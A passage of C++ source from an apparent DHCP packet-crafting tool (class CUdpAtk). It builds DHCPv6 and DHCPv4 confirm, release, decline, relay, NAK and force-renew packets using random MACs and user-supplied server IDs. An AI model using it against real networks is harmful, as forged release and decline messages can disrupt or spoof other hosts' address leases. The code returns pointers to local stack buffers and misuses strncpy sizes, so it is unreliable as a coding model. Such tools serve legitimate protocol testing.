	* 如果指定client_duid 发包工具将只发送固定的duid报文，不指定，默认随机发送
	*/
	char msg_type[3] = "0c";
	char hopcount[3] = "00";
	
	/*获取输入的ipv6地址*/
	libnet_in6_addr src_ip;
	src_ip = get_cur_srcaddr6();
	char srcname[255] = {0};
	libnet_addr2name6_r(src_ip, 1, srcname, 255);
	char link_address[33] = {0};
	util_ipv6_to_str(link_address, srcname);
		
	
	/*判断是随机获取mac地址还是从duid中获取*/
	char client_duid_mac[13] = {0};
	if(strlen(m_params.m_client_id_duid)==0)
	{
		strncpy(client_duid_mac, client_mac, sizeof(client_duid_mac));	
	}
	else{
	/*从client_duid中获取mac地址*/
		char client_duid[37] = {0};
		strncpy(client_duid, m_params.m_client_id_duid, sizeof(m_params.m_client_id_duid));
		int i = strlen(client_duid) -12;
		int j = 0;
		for(i; i<strlen(client_duid); i++)
		{
			client_duid_mac[j] = client_duid[i];
			j++;
		}
	}

	char renew_packet[1024] = {0};
	strncpy(renew_packet, struct_renew_packet(client_duid_mac), sizeof(renew_packet));

	/*构造peer_address的地址*/
	char peer_address[33] = {0};
	char fix_prefix[17] = "fe80000000000000";
	strcat(peer_address, fix_prefix);
	char fix_str[5] = "fffe";
	util_insert(client_duid_mac, fix_str, 6);  //此处对client_mac地址进行叻修改	
	strcat(peer_address, client_duid_mac);
	/*构造relay message*/
	char relay_message[5] = "0009";
	char relay_len[5];
	sprintf(relay_len, "%04x", strlen(renew_packet)/2);
	
	char payload[1024] = {0};
	strcat(payload, msg_type);
	strcat(payload, hopcount);
	strcat(payload, link_address);
	strcat(payload, peer_address);
	strcat(payload, relay_message);
	strcat(payload, relay_len);
	strcat(payload, renew_packet);

	return payload;
}

char* CUdpAtk::struct_relay_confirm_packet(char* client_mac)
{
	char msg_type[3] = "0c";
	char hopcount[3] = "00";
	
	/*获取输入的ipv6地址*/
	libnet_in6_addr src_ip;
	src_ip = get_cur_srcaddr6();
	char srcname[255] = {0};
	libnet_addr2name6_r(src_ip, 1, srcname, 255);
	char link_address[33] = {0};
	util_ipv6_to_str(link_address, srcname);

	/*判断是随机获取mac地址还是从duid中回去*/
	char client_duid_mac[13] = {0};
	if(strlen(m_params.m_client_id_duid)==0)
	{
		strncpy(client_duid_mac, client_mac, sizeof(client_duid_mac));	
	}
	else{
	/*从client_duid中获取mac地址*/
		char client_duid[37] = {0};
		strncpy(client_duid, m_params.m_client_id_duid, sizeof(m_params.m_client_id_duid));
		int i = strlen(client_duid) -12;
		int j = 0;
		for(i; i<strlen(client_duid); i++)
		{
			client_duid_mac[j] = client_duid[i];
			j++;
		}
	}

	char confirm_packet[1024] = {0};
	/*调用struct_confirm_packet， 构造rebind包*/
	strncpy(confirm_packet, struct_confirm_packet(client_duid_mac), sizeof(confirm_packet));

	/*构造peer_address的地址*/
	char peer_address[33] = {0};
	char fix_prefix[17] = "fe80000000000000";
	strcat(peer_address, fix_prefix);
	char fix_str[5] = "fffe";
	util_insert(client_duid_mac, fix_str, 6);  //此处对client_mac地址进行叻修改	
	strcat(peer_address, client_duid_mac);

	/*构造relay message*/
	char relay_message[5] = "0009";
	char relay_len[5] = {0};	
	sprintf(relay_len, "%04x", strlen(confirm_packet)/2);

	char payload[1024] = {0};
	strcat(payload, msg_type);
	strcat(payload, hopcount);
	strcat(payload, link_address);
	strcat(payload, peer_address);
	strcat(payload, relay_message);
	strcat(payload, relay_len);
	strcat(payload, confirm_packet);

	return payload;
}
char* CUdpAtk::struct_confirm_packet(char* client_mac)
{		
	char msg_type[3] = "04";
	char transacation_id[7] = {0};
	char metachar[] = "0123456789abcdef";
	srand((unsigned) time(NULL));
	for (int i = 0; i < 6; i++)
	{
		transacation_id[i] = metachar[(rand()+this->m_curcnt_total) % 16];
	}

	/*构造client identifier*/
	char option_client[37] = {0};
	char option_id[5] = "0001";
	if(strlen(m_params.m_client_id_duid)==0)
	{
		
		char option_len[5] = "000e";
		char option_DUID_type[5] = "0001";
		char option_hw_type[5] = "0001";
		// int32_t time_stamp = 0;
		/*获取系统当前时间戳*/
		// time_t t;
		// t = time(NULL);
		// int32_t cur_time = time(&t);
		// int32_t DUID_time_stamp = cur_time - time_stamp;
		char DUID_time_stamp_str[9] = {0};
		sprintf(DUID_time_stamp_str, "%08x", 0);

		strcat(option_client, option_id);
		strcat(option_client, option_len);
		strcat(option_client, option_DUID_type);
		strcat(option_client, option_hw_type);
		strcat(option_client, DUID_time_stamp_str);
		strcat(option_client, client_mac);
	}
	else
	{
		// char option_id[5] = "0001";
		char option_client_len[5] = {0};
		char option_client_duid[37] = {0};
		strncpy(option_client_duid, m_params.m_client_id_duid, sizeof(m_params.m_client_id_duid));
		sprintf(option_client_len, "%04x", strlen(option_client_duid)/2);
		strcat(option_client, option_id);
		strcat(option_client, option_client_len);
		strcat(option_client, option_client_duid);
	}

	/*构造固定的option request*/
	char option_request[17] = "0006000400170018";

	/*构造固定的IANA*/
	char option_IANA[89] = {0};
	char option_iana_iaid[9] = {0};
	char option_t1_t2[17] = "0000000000000000";

	for(int i=4; i<strlen(client_mac); i++)
	{
		option_iana_iaid[i-4] = client_mac[i];
	}

	char option_ia_address_ipv6_address[33] = {0};
	char input_ipv6_option[32] = {0};
	strncpy(input_ipv6_option, m_params.m_ipv6_address, sizeof(input_ipv6_option));
	char input_address[33] = {0};
	char ia_address_length[3] = {0}; 
	char *p;
	p = strtok(input_ipv6_option, "/");
	if(p) 
	{
		strncpy(input_address, p, sizeof(input_address));
		util_ipv6_to_str(option_ia_address_ipv6_address, input_address);//
	}
	p=strtok(NULL, "/");
	if(p) strncpy(ia_address_length, p, sizeof(ia_address_length));
	
	/*iana中前缀地址和长度*/
	if(m_params.m_prefix_delegetion)
	{
		char option_iana_type[5] = "0019";
		char option_iana_len[5] = "0029";
		/*构造IANA中的IA_prefix*/
		char option_ia_address_type[5] = "001a";
		char option_ia_address_len[5] = "0019";
		/*求ipv6地址前缀长度*/
		char option_ia_address_prefix_len[3] = {0};
		sprintf(option_ia_address_prefix_len, "%02x", atoi(ia_address_length));	

		strcat(option_IANA, option_iana_type);
		strcat(option_IANA, option_iana_len);
		strcat(option_IANA, option_iana_iaid);
		strcat(option_IANA, option_t1_t2);
		strcat(option_IANA, option_ia_address_type);
		strcat(option_IANA, option_ia_address_len);
		strcat(option_IANA, option_t1_t2);
		strcat(option_IANA, option_ia_address_prefix_len);
		strcat(option_IANA, option_ia_address_ipv6_address);
	}
	else  /*iana中ipv6地址*/
	{
		char option_iana_type[5] = "0003";
		char option_iana_len[5] = "0028";
		
		/*构造IANA中的IA_address*/
		char option_ia_address_type[5] = "0005";
		char option_ia_address_len[5] = "0018";

		strcat(option_IANA, option_iana_type);
		strcat(option_IANA, option_iana_len);
		strcat(option_IANA, option_iana_iaid);
		strcat(option_IANA, option_t1_t2);
		strcat(option_IANA, option_ia_address_type);
		strcat(option_IANA, option_ia_address_len);
		strcat(option_IANA, option_ia_address_ipv6_address);
		strcat(option_IANA, option_t1_t2);
	}


	/*构造整体的payload*/	
	char payload[1024] = {0};	
	strcat(payload, msg_type);
	strcat(payload, transacation_id);
	strcat(payload, option_client);
	// printf("option_client:%s\n", option_client);
	strcat(payload, option_request);
	strcat(payload, option_IANA);
	return payload;
}

char* CUdpAtk::struct_release_packet(char* client_mac)
{
	char msg_type[3] = "08";
	char transacation_id[7] = {0};
	char metachar[] = "0123456789abcdef";
	srand((unsigned) time(NULL));
	for (int i = 0; i < 6; i++)
	{
		transacation_id[i] = metachar[(rand()+this->m_curcnt_total) % 16];
	}

	/*构造client identifier*/
	char option_client[37] = {0};
	char option_id[5] = "0001";
	if(strlen(m_params.m_client_id_duid)==0)
	{
		
		char option_len[5] = "000e";
		char option_DUID_type[5] = "0001";
		char option_hw_type[5] = "0001";
		// int32_t time_stamp = 0;
		/*获取系统当前时间戳*/
		// time_t t;
		// t = time(NULL);
		// int32_t cur_time = time(&t);
		// int32_t DUID_time_stamp = cur_time - time_stamp;
		char DUID_time_stamp_str[9];
		sprintf(DUID_time_stamp_str, "%08x", 0);

		strcat(option_client, option_id);
		strcat(option_client, option_len);
		strcat(option_client, option_DUID_type);
		strcat(option_client, option_hw_type);
		strcat(option_client, DUID_time_stamp_str);
		//printf("###############client_mac:%s\n", client_mac);
		strcat(option_client, client_mac);
	}
	else
	{
		char option_id[5] = "0001";
		char option_client_len[5] = {0};
		char option_client_duid[37] = {0};
		strncpy(option_client_duid, m_params.m_client_id_duid, sizeof(m_params.m_client_id_duid));
		sprintf(option_client_len, "%04x", strlen(option_client_duid)/2);
		strcat(option_client, option_id);
		strcat(option_client, option_client_len);
		strcat(option_client, option_client_duid);
	}

	/*构造server identifier*/
	char option_server[37] = {0};
	char option_server_id_type[5] = "0002";
	char option_server_len[5] = {0};  //后续可以根据实际长度算出来
	char option_server_duid[37] = {0};
	//= m_params.m_server_id_duid;
	strncpy(option_server_duid, m_params.m_server_id_duid, sizeof(m_params.m_server_id_duid));
	//printf("strlen(option_server_duid):%d, option_server_duid:%s\n", strlen(option_server_duid), option_server_duid);

	sprintf(option_server_len, "%04x", strlen(option_server_duid)/2);
	//printf("option_server_len:%s\n", option_server_len);
	strcat(option_server, option_server_id_type);
	strcat(option_server, option_server_len);
	strcat(option_server, option_server_duid);
	
	/*构造固定的option request*/
	char option_request[17] = "0006000400170018";
	/*构造固定的IANA*/
	char option_IANA[89] = {0};
	char option_iana_iaid[9] = {0};
	char option_t1_t2[17] = "0000000000000000";

	for(int i=4; i<strlen(client_mac); i++)
	{
		option_iana_iaid[i-4] = client_mac[i];
	}

	char option_ia_address_ipv6_address[33] = {0};
	char input_ipv6_option[32] = {0};
	strncpy(input_ipv6_option, m_params.m_ipv6_address, sizeof(input_ipv6_option));
	char input_address[33] = {0};
	char ia_address_length[3] = {0}; 
	char *p;
	p = strtok(input_ipv6_option, "/");
	if(p) 
	{
		strncpy(input_address, p, sizeof(input_address));
		util_ipv6_to_str(option_ia_address_ipv6_address, input_address);//
	}
	p=strtok(NULL, "/");
	if(p) strncpy(ia_address_length, p, sizeof(ia_address_length));
	
	/*iana中前缀地址和长度*/
	if(m_params.m_prefix_delegetion)
	{
		char option_iana_type[5] = "0019";
		char option_iana_len[5] = "0029";
		/*构造IANA中的IA_prefix*/
		char option_ia_address_type[5] = "001a";
		char option_ia_address_len[5] = "0019";
		/*求ipv6地址前缀长度*/
		char option_ia_address_prefix_len[3] = {0};
		sprintf(option_ia_address_prefix_len, "%02x", atoi(ia_address_length));	

		strcat(option_IANA, option_iana_type);
		strcat(option_IANA, option_iana_len);
		strcat(option_IANA, option_iana_iaid);
		strcat(option_IANA, option_t1_t2);
		strcat(option_IANA, option_ia_address_type);
		strcat(option_IANA, option_ia_address_len);
		strcat(option_IANA, option_t1_t2);
		strcat(option_IANA, option_ia_address_prefix_len);
		strcat(option_IANA, option_ia_address_ipv6_address);
	}
	/*iana中ipv6地址*/
	else
	{
		char option_iana_type[5] = "0003";
		char option_iana_len[5] = "0028";
		
		//char option_t1_t2[17] = "00000e1000001518";
		/*构造IANA中的IA_address*/
		char option_ia_address_type[5] = "0005";
		char option_ia_address_len[5] = "0018";

		strcat(option_IANA, option_iana_type);
		strcat(option_IANA, option_iana_len);
		strcat(option_IANA, option_iana_iaid);
		strcat(option_IANA, option_t1_t2);
		strcat(option_IANA, option_ia_address_type);
		strcat(option_IANA, option_ia_address_len);
		strcat(option_IANA, option_ia_address_ipv6_address);
		strcat(option_IANA, option_t1_t2);
	}
	
	char payload[1024] = {0};
	strcat(payload, msg_type);
	strcat(payload, transacation_id);
	strcat(payload, option_client);
	strcat(payload, option_server);
	strcat(payload, option_request);
	strcat(payload, option_IANA);

	return payload;

}

char* CUdpAtk::struct_relay_release_packet(char* client_mac)
{
	/*
	* 如果指定client_duid 发包工具将只发送固定的duid报文，不指定，默认随机发送
	*/
	char msg_type[3] = "0c";
	char hopcount[3] = "00";
	
	/*获取输入的ipv6地址*/
	libnet_in6_addr src_ip;
	src_ip = get_cur_srcaddr6();
	char srcname[255] = {0};
	libnet_addr2name6_r(src_ip, 1, srcname, 255);
	char link_address[33] = {0};
	util_ipv6_to_str(link_address, srcname);
		
	

	char client_duid_mac[13] = {0};
	if(strlen(m_params.m_client_id_duid)==0)
	{
		strncpy(client_duid_mac, client_mac, sizeof(client_duid_mac));	
	}
	else{
	/*从client_duid中获取mac地址*/
		char client_duid[37] = {0};
		strncpy(client_duid, m_params.m_client_id_duid, sizeof(m_params.m_client_id_duid));
		int i = strlen(client_duid) -12;
		int j = 0;
		for(i; i<strlen(client_duid); i++)
		{
			client_duid_mac[j] = client_duid[i];
			j++;
		}
	}

	char release_packet[1024] = {0};
	strncpy(release_packet, struct_release_packet(client_duid_mac), sizeof(release_packet));
	/*构造peer_address的地址*/
	char peer_address[33] = {0};
	char fix_prefix[17] = "fe80000000000000";
	strcat(peer_address, fix_prefix);
	char fix_str[5] = "fffe";
	util_insert(client_duid_mac, fix_str, 6);  	
	strcat(peer_address, client_duid_mac);
	/*构造relay message*/
	char relay_message[5] = "0009";
	char relay_len[5];
	sprintf(relay_len, "%04x", strlen(release_packet)/2);
	
	char payload[1024] = {0};
	strcat(payload, msg_type);
	strcat(payload, hopcount);
	strcat(payload, link_address);
	strcat(payload, peer_address);
	strcat(payload, relay_message);
	strcat(payload, relay_len);
	strcat(payload, release_packet);

	return payload;
}

char* CUdpAtk::struct_decline_packet(char* client_mac)
{
	char msg_type[3] = "09";
	char transacation_id[7] = {0};
	char metachar[] = "0123456789abcdef";
	srand((unsigned) time(NULL));
	for (int i = 0; i < 6; i++)
	{
		transacation_id[i] = metachar[(rand()+this->m_curcnt_total) % 16];
	}

	/*构造client identifier*/
	char option_client[37] = {0};
	char option_id[5] = "0001";
	if(strlen(m_params.m_client_id_duid)==0)
	{		
		char option_len[5] = "000e";
		char option_DUID_type[5] = "0001";
		char option_hw_type[5] = "0001";
		// int32_t time_stamp = 0;
		/*获取系统当前时间戳*/
		// time_t t;
		// t = time(NULL);
		// int32_t cur_time = time(&t);
		// int32_t DUID_time_stamp = cur_time - time_stamp;
		char DUID_time_stamp_str[9];
		sprintf(DUID_time_stamp_str, "%08x", 0);
		strcat(option_client, option_id);
		strcat(option_client, option_len);
		strcat(option_client, option_DUID_type);
		strcat(option_client, option_hw_type);
		strcat(option_client, DUID_time_stamp_str);
		//printf("###############client_mac:%s\n", client_mac);
		strcat(option_client, client_mac);
	}
	else
	{
		char option_id[5] = "0001";
		char option_client_len[5] = {0};
		char option_client_duid[37] = {0};
		strncpy(option_client_duid, m_params.m_client_id_duid, sizeof(m_params.m_client_id_duid));
		sprintf(option_client_len, "%04x", strlen(option_client_duid)/2);
		strcat(option_client, option_id);
		strcat(option_client, option_client_len);
		strcat(option_client, option_client_duid);
	}

	/*构造server identifier*/
	char option_server[37] = {0};
	char option_server_id_type[5] = "0002";
	char option_server_len[5] = {0};  //后续可以根据实际长度算出来
	char option_server_duid[37] = {0};
	strncpy(option_server_duid, m_params.m_server_id_duid, sizeof(m_params.m_server_id_duid));
	//printf("strlen(option_server_duid):%d, option_server_duid:%s\n", strlen(option_server_duid), option_server_duid);

	sprintf(option_server_len, "%04x", strlen(option_server_duid)/2);
	//printf("option_server_len:%s\n", option_server_len);
	strcat(option_server, option_server_id_type);
	strcat(option_server, option_server_len);
	strcat(option_server, option_server_duid);
	
	/*构造固定的option request*/
	char option_request[17] = "0006000400170018";

	/*构造固定的IANA*/
	char option_IANA[89] = {0};
	char option_iana_iaid[9] = {0};
	char option_t1_t2[17] = "0000000000000000";

	for(int i=4; i<strlen(client_mac); i++)
	{
		option_iana_iaid[i-4] = client_mac[i];
	}

	char option_ia_address_ipv6_address[33] = {0};
	char input_ipv6_option[32] = {0};
	strncpy(input_ipv6_option, m_params.m_ipv6_address, sizeof(input_ipv6_option));
	char input_address[33] = {0};
	char ia_address_length[3] = {0}; 
	char *p;
	p = strtok(input_ipv6_option, "/");
	if(p) 
	{
		strncpy(input_address, p, sizeof(input_address));
		util_ipv6_to_str(option_ia_address_ipv6_address, input_address);//
	}
	p=strtok(NULL, "/");
	if(p) strncpy(ia_address_length, p, sizeof(ia_address_length));
	/*iana中前缀地址和长度*/
	if(m_params.m_prefix_delegetion)
	{
		char option_iana_type[5] = "0019";
		char option_iana_len[5] = "0029";
		/*构造IANA中的IA_prefix*/
		char option_ia_address_type[5] = "001a";
		char option_ia_address_len[5] = "0019";
		/*求ipv6地址前缀长度*/
		char option_ia_address_prefix_len[3] = {0};
		sprintf(option_ia_address_prefix_len, "%02x", atoi(ia_address_length));	

		strcat(option_IANA, option_iana_type);
		strcat(option_IANA, option_iana_len);
		strcat(option_IANA, option_iana_iaid);
		strcat(option_IANA, option_t1_t2);
		strcat(option_IANA, option_ia_address_type);
		strcat(option_IANA, option_ia_address_len);
		strcat(option_IANA, option_t1_t2);
		strcat(option_IANA, option_ia_address_prefix_len);
		strcat(option_IANA, option_ia_address_ipv6_address);
	}
	/*iana中ipv6地址*/
	else
	{
		char option_iana_type[5] = "0003";
		char option_iana_len[5] = "0028";
		
		//char option_t1_t2[17] = "00000e1000001518";
		/*构造IANA中的IA_address*/
		char option_ia_address_type[5] = "0005";
		char option_ia_address_len[5] = "0018";

		strcat(option_IANA, option_iana_type);
		strcat(option_IANA, option_iana_len);
		strcat(option_IANA, option_iana_iaid);
		strcat(option_IANA, option_t1_t2);
		strcat(option_IANA, option_ia_address_type);
		strcat(option_IANA, option_ia_address_len);
		strcat(option_IANA, option_ia_address_ipv6_address);
		strcat(option_IANA, option_t1_t2);
	}

	
	char payload[1024] = {0};
	strcat(payload, msg_type);
	strcat(payload, transacation_id);
	strcat(payload, option_client);
	strcat(payload, option_server);
	strcat(payload, option_request);
	strcat(payload, option_IANA);

	return payload;
}

char* CUdpAtk::struct_relay_decline_packet(char* client_mac)
{
	/*
	* 如果指定client_duid 发包工具将只发送固定的duid报文，不指定，默认随机发送
	*/
	char msg_type[3] = "0c";
	char hopcount[3] = "00";
	
	/*获取输入的ipv6地址*/
	libnet_in6_addr src_ip;
	src_ip = get_cur_srcaddr6();
	char srcname[255] = {0};
	libnet_addr2name6_r(src_ip, 1, srcname, 255);
	char link_address[33] = {0};
	util_ipv6_to_str(link_address, srcname);
		
	

	char client_duid_mac[13] = {0};
	if(strlen(m_params.m_client_id_duid)==0)
	{
		strncpy(client_duid_mac, client_mac, sizeof(client_duid_mac));	
	}
	else{
	/*从client_duid中获取mac地址*/
		char client_duid[37] = {0};
		strncpy(client_duid, m_params.m_client_id_duid, sizeof(m_params.m_client_id_duid));
		int i = strlen(client_duid) -12;
		int j = 0;
		for(i; i<strlen(client_duid); i++)
		{
			client_duid_mac[j] = client_duid[i];
			j++;
		}
	}

	char decline_packet[1024] = {0};
	strncpy(decline_packet, struct_decline_packet(client_duid_mac), sizeof(decline_packet));
	
	/*构造peer_address的地址*/
	char peer_address[33] = {0};
	char fix_prefix[17] = "fe80000000000000";
	strcat(peer_address, fix_prefix);
	char fix_str[5] = "fffe";
	util_insert(client_duid_mac, fix_str, 6);  	
	strcat(peer_address, client_duid_mac);
	/*构造relay message*/
	char relay_message[5] = "0009";
	char relay_len[5];
	sprintf(relay_len, "%04x", strlen(decline_packet)/2);
	
	char payload[1024] = {0};
	strcat(payload, msg_type);
	strcat(payload, hopcount);
	strcat(payload, link_address);
	strcat(payload, peer_address);
	strcat(payload, relay_message);
	strcat(payload, relay_len);
	strcat(payload, decline_packet);

	return payload;
}


char* CUdpAtk::MsgTypeChoice()
{
	char client_mac[13] = {0}; //mac为16字节，128位=32*	
	this->get_random_mac(client_mac);
	
	char payload_data[1024] = {0};	
	if(m_params.m_msg_type == 1)
	{
		strncpy(payload_data, struct_solicit_packet(client_mac), sizeof(payload_data));
	}
	else if(m_params.m_msg_type==4)
	{
		if(strlen(m_params.m_ipv6_address)==0)
		{
			printf("the rebind_ipv6_address is indispensable when msg_type is confirm;\n");
			exit(1);
		}
		strncpy(payload_data, struct_confirm_packet(client_mac), sizeof(payload_data));
	}

	else if(m_params.m_msg_type==12)
	{
		strncpy(payload_data, struct_solicit_packet(client_mac), sizeof(payload_data));
	}
	else if(m_params.m_msg_type==3)
	{
		/*
		*发送request请求
		*/
		if(strlen(m_params.m_ipv6_address)==0 || strlen(m_params.m_server_id_duid)==0)
		{
			printf("the ipv6 address or server duid is indispensable when msg_type is renew;\n");
			exit(1);
		}
		strncpy(payload_data, struct_request_packet(client_mac), sizeof(payload_data));	
	}
	else if(m_params.m_msg_type==5)
	{
		if(strlen(m_params.m_ipv6_address)==0 || strlen(m_params.m_server_id_duid)==0)
		{
			printf("the ipv6 address or server duid is indispensable when msg_type is renew;\n");
			exit(1);
		}
		strncpy(payload_data, struct_renew_packet(client_mac), sizeof(payload_data));	
	}
	else if(m_params.m_msg_type == 6)
	{
		if(strlen(m_params.m_ipv6_address)==0)
		{
			printf("the rebind_ipv6_address is indispensable when msg_type is rebind;\n");
			exit(1);
		}
		strncpy(payload_data, struct_rebind_packet(client_mac), sizeof(payload_data));
	}
	else if(m_params.m_msg_type == 8)
	{
		if(strlen(m_params.m_ipv6_address)==0 || strlen(m_params.m_server_id_duid)==0)
		{
			printf("the ipv6 address or server duid is indispensable when msg_type is release;\n");
			exit(1);
		}
		strncpy(payload_data, struct_release_packet(client_mac), sizeof(payload_data));	
	}
	else if(m_params.m_msg_type == 20)
	{
		if(strlen(m_params.m_ipv6_address)==0 || strlen(m_params.m_server_id_duid)==0)
		{
			printf("the ipv6 address or server duid is indispensable when msg_type is release;\n");
			exit(1);
		}
		strncpy(payload_data, struct_relay_release_packet(client_mac), sizeof(payload_data));	
	}
	else if(m_params.m_msg_type == 9)
	{
		if(strlen(m_params.m_ipv6_address)==0 || strlen(m_params.m_server_id_duid)==0)
		{
			printf("the ipv6 address or server duid is indispensable when msg_type is release;\n");
			exit(1);
		}
		strncpy(payload_data, struct_decline_packet(client_mac), sizeof(payload_data));	
	}
	else if(m_params.m_msg_type == 21)
	{
		if(strlen(m_params.m_ipv6_address)==0 || strlen(m_params.m_server_id_duid)==0)
		{
			printf("the ipv6 address or server duid is indispensable when msg_type is release;\n");
			exit(1);
		}
		strncpy(payload_data, struct_relay_decline_packet(client_mac), sizeof(payload_data));	
	}
	else if(m_params.m_msg_type == 13)
	{
		/*13=12+1 表示RELAY-FORW中继转发的solicit报文*/
		strncpy(payload_data, struct_relay_solicit_packet(client_mac), sizeof(payload_data));
	}
	else if(m_params.m_msg_type == 16)
	{
		/*16=12+4 表示RELAY-FORW中继转发的confirm报文*/
		if(strlen(m_params.m_ipv6_address)==0)
		{
			printf("the rebind_ipv6_address is indispensable when msg_type is confirm;\n");
			exit(1);
		}
		strncpy(payload_data, struct_relay_confirm_packet(client_mac), sizeof(payload_data));
	}
	else if(m_params.m_msg_type == 15)
	{
		/*15=12+3 表示RELAY-FORW中继转发的request报文*/
		if(strlen(m_params.m_ipv6_address)==0 || strlen(m_params.m_server_id_duid)==0)
		{
			printf("the renew_ipv6_address or server_id_duid is indispensable when msg_type is renew;\n");
			exit(1);
		}
		strncpy(payload_data, struct_relay_request_packet(client_mac), sizeof(payload_data));	
	}
	else if(m_params.m_msg_type == 17)
	{
		/*17=12+5 表示RELAY-FORW中继转发的renew报文*/
		if(strlen(m_params.m_ipv6_address)==0 || strlen(m_params.m_server_id_duid)==0)
		{
			printf("the renew_ipv6_address or server_id_duid is indispensable when msg_type is renew;\n");
			exit(1);
		}
		strncpy(payload_data, struct_relay_renew_packet(client_mac), sizeof(payload_data));	
	}
	else if(m_params.m_msg_type == 18)
	{
		/*18=12+6 表示RELAY-FORW中继转发的rebind报文*/
		if(strlen(m_params.m_ipv6_address)==0)
		{
			printf("the rebind_ipv6_address is indispensable when msg_type is rebind;\n");
			exit(1);
		}
		strncpy(payload_data, struct_relay_rebind_packet(client_mac), sizeof(payload_data));
	}

	else if(m_params.m_msg_type == 23)
	{
		/*23=12+11 表示RELAY-FORW中继转发的rebind报文*/	
		strncpy(payload_data, struct_relay_information_packet(client_mac), sizeof(payload_data));
	}
	else
	{
		printf("the msg_tpye not define\n");
		exit(1);
	}

	int pay_len;
	pay_len = strlen(payload_data);
	m_params.m_payload_len = pay_len/2+1;
	char * pay_load = NULL;
	pay_load = (char*)malloc(sizeof(char) * (pay_len/2 + 1) );
	int flag = 1;
	flag = hex2str(pay_load, payload_data, pay_len);
	return pay_load;
}

char* CUdpAtk::MsgTypeChoiceV4()
{

	char client_mac[13] = {0}; //mac为16字节，128位=32*	
	this->get_random_mac(client_mac);
	
	char payload_data[1024] = {0};
	if(m_params.m_msg_type == 1)  //发送discover
	{
		strncpy(payload_data, struct_discover_packet_v4(client_mac), sizeof(payload_data));
	}
	else if(m_params.m_msg_type == 7) //发送release报文
	{
		if(strlen(m_params.m_ipv4_address)==0 || strlen(m_params.m_server_id_duid)==0)
		{
			printf("the relase ip and server_id is indispensable when msg_type is relaese;\n");
			exit(1);
		}
		strncpy(payload_data, struct_release_packet_v4(client_mac), sizeof(payload_data));	
	}
	else if(m_params.m_msg_type == 4) //发送decline报文
	{
		if(strlen(m_params.m_ipv4_address)==0)
		{
			printf("the decline ip and server_id is indispensable when msg_type is decline;\n");
			exit(1);
		}
		strncpy(payload_data, struct_decline_packet_v4(client_mac), sizeof(payload_data));	
	}
	else if(m_params.m_msg_type == 3) //发生ipv4地址续约(ipv4的地址续约是request)报文, 重新续约
	{
		if(m_params.m_bootp){
			strncpy(payload_data, struct_bootp_packet_v4(client_mac), sizeof(payload_data));
		}
		else{
			if(strlen(m_params.m_ipv4_address)==0)
			{
				printf("the renew ip is indispensable when msg_type is renew;\n");
				exit(1);
				}
			strncpy(payload_data, struct_renew_packet_v4(client_mac), sizeof(payload_data));	
		}
	}
	else if(m_params.m_msg_type == 6) //服务器端发送nak报文
	{
		// if(strlen(m_params.m_ipv4_address)==0 || strlen(m_params.m_server_id_duid)==0)
		// {
		// 	printf("the relase ip and server_id is indispensable when msg_type is relaese;\n");
		// 	exit(1);
		// }
		strncpy(payload_data, struct_nak_packet_v4(client_mac), sizeof(payload_data));	
	}
	
	else if(m_params.m_msg_type == 8) //发送infrom报文
	{
		// if(strlen(m_params.m_ipv4_address)==0 || strlen(m_params.m_server_id_duid)==0)
		// {
		// 	printf("the relase ip and server_id is indispensable when msg_type is relaese;\n");
		// 	exit(1);
		// }
		strncpy(payload_data, struct_inform_packet_v4(client_mac), sizeof(payload_data));	
	}
	else if(m_params.m_msg_type == 9) //服务器端发送强制更新报文
	{
		// if(strlen(m_params.m_ipv4_address)==0 || strlen(m_params.m_server_id_duid)==0)
		// {
		// 	printf("the relase ip and server_id is indispensable when msg_type is relaese;\n");
		// 	exit(1);
		// }
		strncpy(payload_data, struct_forcerenew_packet_v4(client_mac), sizeof(payload_data));	
	}
	else
	{
		printf("the msg_tpye not define\n");
		exit(1);
	}

	int pay_len;
	pay_len = strlen(payload_data);
	m_params.m_payload_len = pay_len/2+1;
	char * pay_load = NULL;
	pay_load = (char*)malloc(sizeof(char) * (pay_len/2 + 1) );
	int flag = 1;
	flag = hex2str(pay_load, payload_data, pay_len);
	return pay_load;

}
char* CUdpAtk::struct_release_packet_v4(char* client_mac)
{
	char stationary[9] = "01010601";  //记录msg_type, hardware_type, hardware_address, hops的数据
	char transacation_id[9] = {0};
	char metachar[] = "0123456789abcdef";
	srand((unsigned) time(NULL));
	for (int i = 0; i < 8; i++)
	{
		transacation_id[i] = metachar[(rand()+this->m_curcnt_total) % 16];
	}
	char secs_flags_ciaddr_yiaddr_siaddr[33] = {0}; 
	
	char seconds_elapsed[9] = "00000000";
	char client_ip_address[8] = {0};
	char tmp_client_ip_address[16] = {0};
	strncpy(tmp_client_ip_address, m_params.m_ipv4_address, sizeof(tmp_client_ip_address));
	ip_address_hex(tmp_client_ip_address, client_ip_address);
	//printf("m_ipv4_address:%s, client_ip_address:%s\n", m_params.m_ipv4_address, client_ip_address);
	char your_client_ip_address[9] = "00000000";
	char next_server_ip_address[9] = "00000000";
	strcat(secs_flags_ciaddr_yiaddr_siaddr, seconds_elapsed);
	strcat(secs_flags_ciaddr_yiaddr_siaddr, client_ip_address);
	strcat(secs_flags_ciaddr_yiaddr_siaddr, your_client_ip_address);
	strcat(secs_flags_ciaddr_yiaddr_siaddr, next_server_ip_address);

	uint32_t src_ip;
	src_ip = get_cur_srcaddr();
	char relay_ip[9] = {0};   //中继的ip地址与输入源IP地址一样
	sprintf(relay_ip, "%08x", src_ip);

	char padding_client_mac[21] = "00000000000000000000";
	char server_name[129] = "00000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000";
	char boot_file[257]="0000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000";
	char magic_cookie[9] = "63825363";

	char option_dhcp_msg_type[7] = "350107"; //optiron 53, DHCP类型为release, 值为7
	char option_end[3] = "ff";  //option的结束符
	/*获取server id*/
	char option_server_id[13] = {0};
	strncpy(option_server_id, m_params.m_server_id_duid, sizeof(m_params.m_server_id_duid));


	char payload[1024] = {0};
	strcat(payload, stationary);
	strcat(payload, transacation_id);
	strcat(payload, secs_flags_ciaddr_yiaddr_siaddr);

	strcat(payload, relay_ip);
	// printf("payload:%s\n", payload);
	strcat(payload, client_mac);
	// printf("payload:%s\n", payload);
	strcat(payload, padding_client_mac);
	strcat(payload, server_name);
	strcat(payload, boot_file);
	strcat(payload, magic_cookie);
	strcat(payload, option_dhcp_msg_type);
	strcat(payload, option_server_id);
	strcat(payload, m_params.m_options);
	strcat(payload, option_end);
	return payload;
}

char* CUdpAtk::struct_decline_packet_v4(char* client_mac)
{
